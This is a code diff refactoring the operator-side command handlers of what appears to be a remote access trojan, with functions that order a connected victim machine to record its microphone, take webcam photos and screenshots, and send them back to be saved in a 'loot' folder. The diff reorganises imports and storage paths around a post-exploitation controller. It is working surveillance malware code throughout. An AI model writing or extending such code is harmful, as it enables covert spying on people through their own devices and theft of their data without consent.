@@ -1,11 +1,10 @@
-from .encrypter import *
 from .system import system
 from .options import *
-from .comm import send_data, recv_data
-from colorama import Fore, init, Style
-from threading import *
-from .post_exploit_controller import PostExploitController
-import random, os, struct, simplejson
+from core.server.comm import send_data, recv_data
+from core.utils.paths import ensure_project_dir, get_project_path
+from colorama import Fore
+from agent.post_exploit.post_exploit_controller import PostExploitController
+import random, os, simplejson
 
 post_exploit_controller = PostExploitController()
 
@@ -74,15 +73,15 @@ def sysinfo(conn, address):
     input("OK")
 
 def mic(conn, address):
-    if not os.path.exists("records"): os.makedirs("records")
+    records_dir = ensure_project_dir("storage", "loot", "records")
     number = random.randint(0, 9999999)
     print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
     send_data(conn, b"MODE_MIC")
     data = recv_data(conn, decode=False)
-    with open(f"records/record{number}.wav", "wb") as f:
+    output_path = os.path.join(records_dir, f"record{number}.wav")
+    with open(output_path, "wb") as f:
         f.write(data)
-        f.close()
-    print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: records/record{number}.wav")
+    print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: {output_path}")
     input("OK")
 def getInput(conn):
     send_data(conn, b"SHELLINFO")
@@ -149,26 +148,28 @@ def download(conn, address):
     input("OK")
 
 def cam(conn, address):
-    if not os.path.exists("photos"): os.makedirs("photos")
+    photos_dir = ensure_project_dir("storage", "loot", "photos")
     number = random.randint(0, 9999999)
     print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
     send_data(conn, b"MODE_CAM")
     data = recv_data(conn, decode=False)
-    with open(f"photos/photo{number}.jpg", "wb") as f:
+    output_path = os.path.join(photos_dir, f"photo{number}.jpg")
+    with open(output_path, "wb") as f:
         f.write(data)
-    print(Fore.LIGHTCYAN_EX + f"[+] Taked Photo: photos/photo{number}.jpg")
+    print(Fore.LIGHTCYAN_EX + f"[+] Taked Photo: {output_path}")
     input("OK")
 
 def screenshot(conn, address):
-    if not os.path.exists("photos"): os.makedirs("photos")
+    photos_dir = ensure_project_dir("storage", "loot", "photos")
     try:
         number = random.randint(0, 9999999)
         print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
         send_data(conn, b"MODE_SCREENSHOT")
         data = recv_data(conn, decode=False)
-        with open(f"photos/screenshot{number}.jpg", "wb") as f:
+        output_path = os.path.join(photos_dir, f"screenshot{number}.jpg")
+        with open(output_path, "wb") as f:
             f.write(data)
-        print(Fore.LIGHTCYAN_EX + f"[+] Screenshot: photos/screenshot{number}.jpg")
+        print(Fore.LIGHTCYAN_EX + f"[+] Screenshot: {output_path}")
     except Exception as e: 
         print(e)
         input("OK")
